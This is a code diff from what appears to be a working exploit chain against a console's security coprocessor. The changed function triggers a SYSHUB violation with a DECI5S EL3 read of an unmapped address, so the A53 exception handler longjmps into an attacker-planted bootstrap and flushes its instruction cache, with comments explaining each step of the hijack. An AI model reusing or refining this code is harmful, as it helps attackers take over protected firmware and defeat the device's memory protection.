@@ -250,21 +250,31 @@ int prosperous_run(void)
      * TMR 20 is still active at this point, so the read will be blocked
      * (returns garbage) but the violation interrupt fires on the A53.
      */
-    printf("[*] Triggering SYSHUB violation to fire jmpbuf bootstrap...\n");
+    /* Trigger SYSHUB violation via DECI5S to fire the jmpbuf bootstrap.
+     *
+     * SYSHUB violations (GIC IRQ 33) are generated when the A53 itself
+     * accesses an unmapped SYSHUB address — NOT by x86 reading TMR memory.
+     *
+     * We use DECI5S READ_MEMORY with EL3_VA_TO_EL3_VA access type to make
+     * the A53 read from VA 0x70000000. This address:
+     *   - Passes the EL3 MMU check (AT S1E3R succeeds)
+     *   - Fails at the SYSHUB TLB (no mapping → violation)
+     *   - Fires GIC IRQ 33 → exception handler checks qword_123180
+     *   - qword_123180 is armed → longjmp to bootstrap → IC IALLU
+     *
+     * The DECI5S read will timeout (A53 longjmps out of the handler),
+     * which is expected — the side effect (I-cache flush) is the goal.
+     */
+    printf("[*] Triggering SYSHUB violation via DECI5S VA read...\n");
     for (int attempt = 0; attempt < 5; attempt++) {
-        /* Read TMR-protected MP4 DRAM via kernel R/W primitive to trigger
-         * SYSHUB violation (GIC IRQ 33). TMR 20 is active, so the read is
-         * blocked by the SB but generates a violation interrupt to the A53.
-         *
-         * Must use kernel_getint (kernel copyin/copyout), NOT raw pointer
-         * dereference — the DMAP address is a kernel VA, inaccessible from
-         * userspace. A raw dereference causes SIGSEGV (process killed). */
-        intptr_t mp4_dram_kva = (intptr_t)(ctx.dmap_base + MP4_DRAM_BASE);
-        uint32_t dummy = kernel_getint(mp4_dram_kva);
-        printf("[DIAG] SYSHUB trigger read @0x%llx: 0x%08x (blocked by TMR)\n",
-               (unsigned long long)mp4_dram_kva, dummy);
+        uint32_t dummy = 0;
+        printf("[*] DECI5S read of unmapped VA 0x70000000 (attempt %d/5)...\n",
+               attempt + 1);
+        int trigger_ret = deci5s_read_el3_va(0x70000000ULL, &dummy, 4);
+        printf("[DIAG] DECI5S VA read returned %d (timeout expected)\n",
+               trigger_ret);
 
-        usleep(500000); /* 500ms for A53 to process the violation */
+        usleep(500000); /* 500ms for A53 to process the violation + bootstrap */
 
         uint64_t jmpbuf_check = 0xDEAD;
         deci5s_read_mem(A53_DRAM_PA_BASE + A53_JMPBUF_PTR_OFF, &jmpbuf_check, 8);
@@ -275,7 +285,6 @@ int prosperous_run(void)
             printf("[+] Bootstrap IC IALLU confirmed — I-cache flushed!\n");
             break;
         }
-        printf("[*] Retrying SYSHUB trigger (attempt %d/5)...\n", attempt + 1);
     }
 
     /* Brief additional wait for thunk to become active after I-cache flush */
